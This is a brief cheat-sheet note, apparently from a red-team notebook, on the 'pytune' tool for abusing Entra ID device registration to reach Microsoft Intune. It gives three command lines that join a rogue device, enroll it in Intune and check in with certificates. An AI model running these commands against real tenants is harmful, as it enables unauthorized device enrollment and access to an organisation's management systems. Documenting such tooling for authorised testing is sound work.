---
tags:
  - cloud
---
A tool to abuse [[Entra ID]] device registration allowing [[Microsoft Intune]] access.
# Join Entra
```
python pytune.py entra_join -o Windows -d device_name -u clouduser@catbird.com -p $USERPASS
```
# Enroll in Intune
```
python pytune.py enroll_intune -v -o Windows -d device_name -c cert.pfx -u clouduser@catbird.com -p $USERPASS --device_token
```
# Checkin
```
python pytune.py checkin -o WIndows -d device_name -u clouduser@catbird.com -p $USERPASS -m mdm.pfx
```